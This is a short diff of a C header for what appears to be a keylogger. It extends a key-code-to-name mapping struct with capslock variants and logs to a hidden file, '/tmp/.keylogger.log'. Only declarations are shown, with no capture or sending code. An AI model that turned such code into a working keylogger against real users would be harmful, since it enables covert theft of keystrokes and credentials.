@@ -7,16 +7,16 @@
 
 #include "behavior_subject.h"
 
+#define KEY_MAP_SIZE 128
 #define BUFFER_SIZE 64
 #define LOG_FILE "/tmp/.keylogger.log"
 
 typedef struct {
     const char *normal;
     const char *shifted;
+    const char *capslocked;
+    const char *shifted_and_capslocked;
 } KeyMap;
-
-extern const KeyMap key_map[];
-extern const int KEY_MAP_SIZE;
 
 const char *get_key_name(int key_code, bool shift_pressed, bool capslock_active);
 char *strdup_alloc(const char *s);
